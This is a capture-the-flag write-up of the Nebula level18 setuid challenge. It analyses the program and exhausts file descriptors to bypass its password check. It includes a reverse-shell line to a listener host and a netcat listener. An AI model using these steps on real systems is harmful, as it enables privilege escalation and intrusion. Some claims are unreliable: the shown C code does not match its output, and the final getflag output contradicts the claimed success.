__LEVEL18 code:__
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <getopt.h>

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");
  
  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
      switch(c) {
          case 'd':
              globals.debugfile = fopen(optarg, "w+");
              if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case 'v':
              globals.verbose++;
              break;
      }
  }

  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());
  
  while(1) {
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin);
      if(q == NULL) break;
      p = strchr(line, '\n'); if(p) *p = 0;
      p = strchr(line, '\r'); if(p) *p = 0;

      dvprintf(2, "got [%s] as input\n", line);

      if(strncmp(line, "login", 5) == 0) {
          dvprintf(3, "attempting to login\n");
          login(line + 6);
      } else if(strncmp(line, "logout", 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "shell", 5) == 0) {
          dvprintf(3, "attempting to start shell\n");
          if(globals.loggedin) {
              execve("/bin/sh", argv, envp);
              err(1, "unable to execve");
          }
          dprintf("Permission denied\n");
      } else if(strncmp(line, "logout", 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "closelog", 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, "site exec", 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, "setuser", 7) == 0) {
          setuser(line + 8);
      }
  }

  return 0;
}

```

We have a pretty long code so let's go step by step but first let's check permissions 

```sh
C:\Users\migue\Documents\Nebula_Exploits\Level18>nc -l -p 8888
level18@nebula:/home/flag18$ ls -lh
ls -lh
total 13K
-rwsr-x--- 1 flag18 level18 12K 2011-11-20 21:22 flag18int
-rw------- 1 flag18 flag18   37 2011-11-20 21:22 password
level18@nebula:/home/flag18$   
```
as we can see the suid bit is set, so if we gain acces over the flag18 program we can get flag18 permissions

```c

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

```
First we have a global variable called globals with attributes:
1. debugfile, a file pointer to what I suppose is a file for printing erros,
2. verbose, an integer that I think is used as a boolean
3. loggedin, an integer and just like verbose I think it is used as a boolean
```c
#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

```
We have defines for creating fast functions to print to the debugfile
__VA__ARGS__ is variadic macro for passing the variadic arguments to the real function.
#### [MORE ON VARIADIC MACROS](https://gcc.gnu.org/onlinedocs/cpp/Variadic-Macros.html)

Also the path of a file storing a password is defined.
```c
void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");
  
  globals.loggedin = 1;

}

```
The function login opens the password file and compares a Cstring passed by argument to the string
in the password file, we have no permission over the password file and the directory that the file 
is in. The acces is through a full path so I don't think we have any vulnerability here. But, if we find out
a way of making fopen fail we can get acces to the logged user functionality.

///AFTER DONE COMMENT
///It's funny that I thought there was no vulnerability and that I thought at first that I had to make fopen fails
///that's exactly what you are supposed to do.

```c
void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}
```
This function prints a defined message,that changes with the argument and then prints the argument to the debugfile.
```c
void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}
```
This function prints a defined message that changes with the username, the function doesn't check for length of the string,
so we might be able to bufferoverflow this program deppending on how it was compiled.

Let's go step by step with main function, as it is huge:
```c
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
      switch(c) {
          case 'd':
              globals.debugfile = fopen(optarg, "w+");
              if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case 'v':
              globals.verbose++;
              break;
      }
  }

```

We have while loop that is used for reading the command line arguments:
-d optarg: opens a global debugfile in the path defined by optarg
-v: increments verbose attribute, we can input multiple -v so verbose changes 

Now let's check the infinite loop

```c 
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin); //q points to line now
      if(q == NULL) break; 
      p = strchr(line, '\n'); if(p) *p = 0; 
      p = strchr(line, '\r'); if(p) *p = 0; 

      dvprintf(2, "got [%s] as input\n", line);

```

Reads from the use input and checks if for the end of the line if it finds end of line the program substitutes it with a end of string

```c

      if(strncmp(line, "login", 5) == 0) {
          dvprintf(3, "attempting to login\n");
          login(line + 6);
      } else if(strncmp(line, "logout", 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "shell", 5) == 0) {
          dvprintf(3, "attempting to start shell\n");
          if(globals.loggedin) {
              execve("/bin/sh", argv, envp);
              err(1, "unable to execve");
          }
          dprintf("Permission denied\n");
      } else if(strncmp(line, "logout", 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "closelog", 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, "site exec", 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, "setuser", 7) == 0) {
          setuser(line + 8);
      }
```
This is the final peace of code, it gets the user input and compares it to different string
depending on the string different functions get executed:
..* login [pass] executes de login function with pass as argument.
..* logout sets the loggedin bit to 0.
..* shell checks if the user is logged in and then executes a new command line.
..* setuser [user] executes setuser function with user as argument

Let's now check for that buffer overflow idea

```sh
level18@nebula:/home/flag18$ python -c "print 'setuser'+'4'*130" | ./flag18
python -c "print 'setuser'+'4'*130" | ./flag18
...
*** buffer overflow detected *** ./flag18 terminated
...
```
Buffer overflow is not an option as expected.

After stracing the program looking for vulnerabilities I found something odd:

```sh
getegid32()                             = 1019
getegid32()                             = 1019
getegid32()                             = 1019
setresgid32(1019, 1019, 1019)           = 0
geteuid32()                             = 1019
geteuid32()                             = 1019
geteuid32()                             = 1019
setresuid32(1019, 1019, 1019)           = 0
fstat64(0, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb779f000
read(0, login what
"login what\n", 4096)           = 11
brk(0)                                  = 0x9419000
brk(0x943a000)                          = 0x943a000
open("/home/flag18/password", O_RDONLY) = -1 EACCES (Permission denied)
read(0,                                          
```

The real uid is set to 1019 our user so we don't have any permissions over the password file,
this seems like a bug provoked by strace or a bug in the nebula machine. Or maybe we need to get acces
before the setresuid function call.

By trying to log without stracing the program I get Permission denied but when I strace the program, 
I get to login and execute the shell of course with level18 permissions. I have searched about this and
didn't get any information so I'll assume strace changes our effecive uid somehow. 
But now we know for sure that if fopen fails we'll get acces to the shell command.

Let's check how can we make fopen fail. 

By searching I found out about linux file descriptors limit and that every user has one and that you can
get to know how much is it.

```sh
level18@nebula:~$ ulimit -Sa
ulimit -Sa
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 15980
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024 ####THIS IS THE IMPORTANT THING
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 15980
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
```
There is a soft limit which can be modified but cannot surpass the hard limit. 
So our soft limit for each process is 1024 and our hard limit is 4096, which means
that we should be able to modify it to 4096.
```sh
level18@nebula:~$ ulimit -n 4096
ulimit -n 4096
level18@nebula:~$ ulimit -Sa
ulimit -Sa
...
open files                      (-n) 4096
....
level18@nebula:~$ ulimit -Ha
ulimit -Ha
...
open files                      (-n) 4096
...
```
Now our script should be able to acces 4096 at once:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
  return 0;
 }
```

After a couple of tries I got to execute a shell with flag18 permissions by executing /home/flag18 on one shell

```sh
level18@nebula:~$ /home/flag18/flag18 /tmp/tmp.sh
login what
shell

this is tmp.sh
#!/bin/bash 
/bin/bash -i /dev/tcp/192.168.56.1/8888 0>&1 #reverse shell
```
and executing my c script 300 hundred times at once 
```c
level18@nebula:/tmp$ for i in {1..300};do /tmp/a.out & done
Something went wrong Too many open files
Something went wrong Too many open files
Something went wrong Too many open files in system
Something went wrong Too many open files in system
```
When the system is full I login and after the system is not full anymore I execute the shell command
and thereby executing /tmp/tmp.sh script and finally a shell with full control over flag18 account.

```sh
C:\Users\migue>nc -l -p 8888
sddsadsadwds
level18@nebula:/tmp$ sddsadsadwds
sddsadsadwds: command not found
level18@nebula:/tmp$ getflag
getflag
getflag is executing on a non-flag account, this doesn't count
```
What a fun challenge
